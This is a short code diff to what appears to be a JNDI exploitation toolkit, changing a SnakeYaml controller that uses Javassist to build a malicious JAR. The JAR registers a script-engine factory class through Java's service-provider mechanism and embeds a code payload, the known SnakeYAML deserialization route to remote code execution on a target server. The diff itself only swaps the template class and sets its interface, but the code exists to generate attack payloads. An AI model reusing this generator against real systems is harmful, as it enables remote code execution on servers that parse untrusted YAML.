@@ -6,7 +6,7 @@ import map.jndi.annotation.JNDIMapping;
 import map.jndi.controller.BasicController;
 import map.jndi.payload.JavaScriptPayload;
 import map.jndi.server.WebServer;
-import map.jndi.template.ScriptEngineFactoryTemplate;
+import map.jndi.template.ScriptLoader;
 import map.jndi.util.JarUtil;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
@@ -35,8 +35,10 @@ public class SnakeYamlController extends BasicController {
                 "]";
 
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(ScriptEngineFactoryTemplate.class.getName());
+        CtClass clazz = pool.get(ScriptLoader.class.getName());
+        CtClass superClazz = pool.get("javax.script.ScriptEngineFactory");
         clazz.replaceClassName(clazz.getName(), factoryClassName);
+        clazz.setInterfaces(new CtClass[]{superClazz});
         ReflectUtil.setCtField(clazz, "code", CtField.Initializer.constant(code));
 
         byte[] jarBytes = JarUtil.createWithSPI("javax.script.ScriptEngineFactory", factoryClassName, clazz.toBytecode());
